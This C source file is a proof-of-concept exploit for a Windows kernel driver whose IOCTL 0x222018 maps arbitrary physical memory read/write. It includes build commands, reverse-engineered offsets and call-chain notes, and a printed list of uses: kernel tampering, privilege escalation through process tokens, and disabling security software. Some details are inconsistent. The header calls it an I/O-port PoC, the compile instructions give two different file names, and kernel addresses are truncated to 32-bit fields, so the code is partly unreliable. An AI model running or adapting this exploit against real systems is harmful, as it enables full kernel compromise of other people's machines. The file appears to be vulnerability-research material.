// Compile with:
// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDDEBUG /Tc 335_poc.c /link /OUT:335.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
// PoC for arbitrary I/O port access

#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

#define IOCTL_PHYS_MAP 0x222018
#define CMD_MAP_PHYSICAL 0x1116
//  \\.\PhysicalDrive1
// Input buffer structure for command 0x1116
// In FUN_140006000, next_dword_in_buffer = param_2 + 4 (i.e., offset 0x10)
// It copies 16 bytes from offset 0x10 into local_38..local_2c:
//   local_38 = [0x10] → sign-extended → local_48 (section handle, OUTPUT)
//   local_34 = [0x14] → size parameter for ZwMapViewOfSection
//   local_30 = [0x18] → sign-extended → local_40 (physical address INPUT)
//   local_2c = [0x1C] → sign-extended → local_50 (mapped VA, OUTPUT)
// Then: FUN_1400057c0(local_40=physaddr, local_34=size, &local_50=&va_out, &local_48=&handle_out)
typedef struct _MAP_PHYSICAL_INPUT {
    ULONG Command;              // Offset 0x00: 0x1116
    ULONG Reserved1;            // Offset 0x04
    ULONG Reserved2;            // Offset 0x08
    ULONG Reserved3;            // Offset 0x0C
    ULONG SectionHandle;        // Offset 0x10: OUTPUT - section handle (returned by driver)
    ULONG SizeInBytes;          // Offset 0x14: INPUT  - size to map
    ULONG PhysicalAddressLow;   // Offset 0x18: INPUT  - physical address (low 32-bit)
    ULONG MappedVA;             // Offset 0x1C: OUTPUT - mapped virtual address (returned)
    // Additional padding to ensure sufficient buffer size
    BYTE Padding[0x100];
} MAP_PHYSICAL_INPUT, *PMAP_PHYSICAL_INPUT;

int main(int argc, char* argv[]) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    MAP_PHYSICAL_INPUT inputBuffer = {0};
    DWORD bytesReturned = 0;
    BOOL success = FALSE;
    ULONG physicalAddress = 0;
    ULONG mapSize = 0;
    
    printf("[*] Arbitrary Physical Memory Mapping PoC\n");
    printf("[*] Vulnerability: Unvalidated physical memory mapping via IOCTL 0x222018\n\n");
    
    // Parse command line arguments
    if (argc < 3) {
        printf("Usage: %s <device_path> <physical_address_hex> [size_hex]\n", argv[0]);
        printf("Example: %s \\\\.\\DeviceName 0x1000 0x1000\n", argv[0]);
        printf("\nNote: Use caution! Mapping arbitrary physical memory can cause system instability.\n");
        printf("      Safe test addresses: Low memory (0x1000-0x9FFFF)\n");
        return 1;
    }
    
    // Parse physical address
    physicalAddress = strtoul(argv[2], NULL, 0);
    
    // Parse size (default to 4KB page)
    if (argc >= 4) {
        mapSize = strtoul(argv[3], NULL, 0);
    } else {
        mapSize = 0x1000;  // Default 4KB
    }
    
    printf("[+] Target Physical Address: 0x%08X\n", physicalAddress);
    printf("[+] Map Size: 0x%08X (%u bytes)\n", mapSize, mapSize);
    
    // Open device handle
    printf("[*] Opening device: %s\n", argv[1]);
    hDevice = CreateFileA(
        argv[1],
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device! Error: %u\n", GetLastError());
        printf("    Common device paths to try:\n");
        printf("    - \\\\.\\DeviceName\n");
        printf("    - \\\\.\\GlobalDeviceName\n");
        return 1;
    }
    
    printf("[+] Device opened successfully! Handle: 0x%p\n", hDevice);
    
    // Prepare input buffer
    inputBuffer.Command = CMD_MAP_PHYSICAL;           // Offset 0x00: sub-command
    inputBuffer.PhysicalAddressLow = physicalAddress;  // Offset 0x18: physical address
    inputBuffer.SizeInBytes = mapSize;                 // Offset 0x14: size to map
    inputBuffer.SectionHandle = 0;                     // Offset 0x10: output (section handle)
    inputBuffer.MappedVA = 0;                          // Offset 0x1C: output (mapped VA)
    
    printf("[*] Sending IOCTL 0x%08X with command 0x%08X\n", IOCTL_PHYS_MAP, CMD_MAP_PHYSICAL);
    printf("[*] Input buffer layout:\n");
    printf("    Offset 0x00 (Command):        0x%08X\n", inputBuffer.Command);
    printf("    Offset 0x14 (Size):           0x%08X\n", inputBuffer.SizeInBytes);
    printf("    Offset 0x18 (PhysicalAddr):   0x%08X\n", inputBuffer.PhysicalAddressLow);
    
    // Send IOCTL
    success = DeviceIoControl(
        hDevice,
        IOCTL_PHYS_MAP,
        &inputBuffer,
        sizeof(inputBuffer),
        &inputBuffer,  // Output buffer (same buffer for in/out)
        sizeof(inputBuffer),
        &bytesReturned,
        NULL
    );
    
    if (!success) {
        printf("[-] DeviceIoControl failed! Error: %u\n", GetLastError());
        printf("    Possible reasons:\n");
        printf("    - Device not initialized (check driver state)\n");
        printf("    - Invalid physical address\n");
        printf("    - Insufficient buffer size\n");
        CloseHandle(hDevice);
        return 1;
    }
    
    printf("[+] IOCTL succeeded! Bytes returned: %u\n", bytesReturned);
    
    // Parse output — driver writes results back into SystemBuffer at offsets 0x10-0x1F
    printf("\n[+] Output buffer contents:\n");
    printf("    Offset 0x10 (Section Handle): 0x%08X\n", inputBuffer.SectionHandle);
    printf("    Offset 0x1C (Mapped VA):      0x%08X\n", inputBuffer.MappedVA);
    
    // Display mapped memory content
    if (inputBuffer.MappedVA != 0) {
        printf("\n[!] SUCCESS: Physical memory 0x%08X mapped to kernel virtual address 0x%08X\n", 
               physicalAddress, inputBuffer.MappedVA);
        printf("[!] This confirms arbitrary physical memory mapping vulnerability!\n");
        printf("\n[*] Raw output buffer (first 32 bytes):\n");
        printf("    ");
        for (int i = 0; i < 32 && i < (int)bytesReturned; i++) {
            printf("%02X ", ((BYTE*)&inputBuffer)[i]);
        }
        printf("\n");
    } else {
        printf("\n[-] Mapping may have failed (mapped VA is NULL)\n");
        printf("    Section handle returned: 0x%08X\n", inputBuffer.SectionHandle);
    }
    
    printf("\n[!] SECURITY IMPACT:\n");
    printf("    - Arbitrary physical memory can be mapped with READ/WRITE permissions\n");
    printf("    - No validation of physical address or size\n");
    printf("    - Can be used to:\n");
    printf("      * Read/modify kernel code and data structures\n");
    printf("      * Escalate privileges by modifying process tokens\n");
    printf("      * Disable security software\n");
    printf("      * Extract sensitive data from memory\n");
    
    // Cleanup
    CloseHandle(hDevice);
    printf("\n[*] Device handle closed\n");
    
    return 0;
}

/*
 * COMPILATION INSTRUCTIONS:
 * -------------------------
 * Using Visual Studio Developer Command Prompt:
 *   cl.exe poc_physmap.c
 * 
 * Using MinGW:
 *   gcc poc_physmap.c -o poc_physmap.exe
 * 
 * USAGE:
 * ------
 * 1. Identify the device path (check driver's device creation in IDA/Ghidra)
 * 2. Run: poc_physmap.exe \\.\DeviceName 0x1000 0x1000
 * 3. The PoC will attempt to map the specified physical address
 * 
 * SAFE TESTING:
 * -------------
 * - Use low physical memory addresses (0x1000-0x9FFFF) for initial testing
 * - These regions are typically safe to read (BIOS data area, video memory)
 * - Avoid mapping critical system structures without proper analysis
 * 
 * VULNERABILITY DETAILS:
 * ----------------------
 * Function: FUN_1400035d0 (IRP_MJ_DEVICE_CONTROL handler)
 * IOCTL: 0x222018
 * Sub-command: 0x1116 (in FUN_140006000)
 * Critical Function: FUN_1400057c0 (physical memory mapper)
 * 
 * Call chain:
 * FUN_1400035d0 -> FUN_140006000 -> FUN_1400057c0 -> ZwMapViewOfSection
 * 
 * The driver copies user-controlled values from SystemBuffer offsets 0x10-0x1F
 * directly to the mapping function without any validation, allowing arbitrary
 * physical memory to be mapped into kernel address space with PAGE_READWRITE.
 */